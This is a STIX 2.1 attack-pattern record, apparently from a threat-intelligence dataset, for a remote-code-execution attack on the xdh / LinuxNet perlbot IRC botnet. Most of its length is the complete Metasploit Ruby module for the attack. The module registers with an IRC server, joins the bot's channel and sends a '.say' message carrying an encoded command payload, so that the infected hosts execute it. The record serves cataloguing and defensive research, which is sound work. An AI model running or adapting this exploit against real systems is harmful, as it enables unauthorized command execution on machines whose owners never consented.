{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--91b68327-ca80-4041-8032-936d3f10a728",
    "created": "2024-08-14T17:06:52.962307Z",
    "modified": "2024-08-14T17:06:52.962311Z",
    "name": "Xdh / LinuxNet Perlbot / fBot IRC Bot Remote Code Execution",
    "description": " This module allows remote command execution on an IRC Bot developed by xdh. This perl bot was caught by Conor Patrick with his shellshock honeypot server and is categorized by Markus Zanke as an fBot (Fire & Forget - DDoS Bot). Matt Thayer also found this script which has a description of LinuxNet perlbot.  The bot answers only based on the servername and nickname in the IRC message which is configured on the perl script thus you need to be an operator on the IRC network to spoof it and in order to exploit this bot or have at least the same ip to the config. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/misc/xdh_x_exec.rb",
            "external_id": "xdh_x_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "https://conorpp.com/blog/a-close-look-at-an-operating-botnet/"
        },
        {
            "source_name": "reference",
            "url": "https://www.alienvault.com/open-threat-exchange/blog/elasticzombie-botnet-exploiting-elasticsearch-vulnerabilities#detailsofwhatanfBotis"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Xdh / LinuxNet Perlbot / fBot IRC Bot Remote Code Execution',\n      'Description'    => %q{\n          This module allows remote command execution on an IRC Bot developed by xdh.\n          This perl bot was caught by Conor Patrick with his shellshock honeypot server\n          and is categorized by Markus Zanke as an fBot (Fire & Forget - DDoS Bot). Matt\n          Thayer also found this script which has a description of LinuxNet perlbot.\n\n          The bot answers only based on the servername and nickname in the IRC message\n          which is configured on the perl script thus you need to be an operator on the IRC\n          network to spoof it and in order to exploit this bot or have at least the same ip\n          to the config.\n        },\n      'Author'         =>\n        [\n          #MalwareMustDie\n          'Jay Turla', # msf\n          'Conor Patrick', # initial discovery and botnet analysis for xdh\n          'Matt Thayer' # initial discovery for LinuxNet perlbot\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'URL', 'https://conorpp.com/blog/a-close-look-at-an-operating-botnet/' ],\n          [ 'URL', 'https://twitter.com/MrMookie/status/673389285676965889' ], # Matt's discovery\n          [ 'URL', 'https://www.alienvault.com/open-threat-exchange/blog/elasticzombie-botnet-exploiting-elasticsearch-vulnerabilities' ] # details of what an fBot is\n        ],\n      'Platform'       => %w{ unix win },\n      'Arch'           => ARCH_CMD,\n      'Payload'        =>\n        {\n          'Space'    => 300, # According to RFC 2812, the max length message is 512, including the cr-lf\n          'DisableNops' => true,\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd'\n            }\n        },\n      'Targets'  =>\n        [\n          [ 'xdh Botnet / LinuxNet perlbot', { } ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2015-12-04',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        Opt::RPORT(6667),\n        OptString.new('IRC_PASSWORD', [false, 'IRC Connection Password', '']),\n        OptString.new('NICK', [true, 'IRC Nickname', 'msfuser']), # botnet administrator name\n        OptString.new('CHANNEL', [true, 'IRC Channel', '#channel'])\n      ])\n  end\n\n  def post_auth?\n    true\n  end\n\n  def check\n    connect\n\n    res = register(sock)\n    if res =~ /463/ || res =~ /464/\n      vprint_error(\"#{rhost}:#{rport}  - Connection to the IRC Server not allowed\")\n      return Exploit::CheckCode::Unknown\n    end\n\n    res = join(sock)\n    if !res =~ /353/ && !res =~ /366/\n      vprint_error(\"#{rhost}:#{rport} - Error joining the #{datastore['CHANNEL']} channel\")\n      return Exploit::CheckCode::Unknown\n    end\n\n    quit(sock)\n    disconnect\n\n    if res =~ /auth/ && res =~ /logged in/\n      Exploit::CheckCode::Vulnerable\n    else\n      Exploit::CheckCode::Safe\n    end\n  end\n\n  def send_msg(sock, data)\n    sock.put(data)\n    data = \"\"\n    begin\n      read_data = sock.get_once(-1, 1)\n      while !read_data.nil?\n        data << read_data\n        read_data = sock.get_once(-1, 1)\n      end\n    rescue ::EOFError, ::Timeout::Error, ::Errno::ETIMEDOUT => e\n      elog(e)\n    end\n\n    data\n  end\n\n  def register(sock)\n    msg = \"\"\n\n    if datastore['IRC_PASSWORD'] && !datastore['IRC_PASSWORD'].empty?\n      msg << \"PASS #{datastore['IRC_PASSWORD']}\\r\\n\"\n    end\n\n    if datastore['NICK'].length > 9\n      nick = rand_text_alpha(9)\n      print_error(\"The nick is longer than 9 characters, using #{nick}\")\n    else\n      nick = datastore['NICK']\n    end\n\n    msg << \"NICK #{nick}\\r\\n\"\n    msg << \"USER #{nick} #{Rex::Socket.source_address(rhost)} #{rhost} :#{nick}\\r\\n\"\n\n    send_msg(sock,msg)\n  end\n\n  def join(sock)\n    join_msg = \"JOIN #{datastore['CHANNEL']}\\r\\n\"\n    send_msg(sock, join_msg)\n  end\n\n  def xdh_command(sock)\n    encoded = payload.encoded\n    command_msg = \"PRIVMSG #{datastore['CHANNEL']} :.say #{encoded}\\r\\n\"\n    send_msg(sock, command_msg)\n  end\n\n  def quit(sock)\n    quit_msg = \"QUIT :bye bye\\r\\n\"\n    sock.put(quit_msg)\n  end\n\n  def exploit\n    connect\n\n    print_status(\"#{rhost}:#{rport} - Registering with the IRC Server...\")\n    res = register(sock)\n    if res =~ /463/ || res =~ /464/\n      print_error(\"#{rhost}:#{rport} - Connection to the IRC Server not allowed\")\n      return\n    end\n\n    print_status(\"#{rhost}:#{rport} - Joining the #{datastore['CHANNEL']} channel...\")\n    res = join(sock)\n    if !res =~ /353/ && !res =~ /366/\n      print_error(\"#{rhost}:#{rport} - Error joining the #{datastore['CHANNEL']} channel\")\n      return\n    end\n\n    print_status(\"#{rhost}:#{rport} - Exploiting the malicious IRC bot...\")\n    xdh_command(sock)\n\n    quit(sock)\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-12-04",
    "x_mitre_platforms": [
        "%w{ unix win }"
    ]
}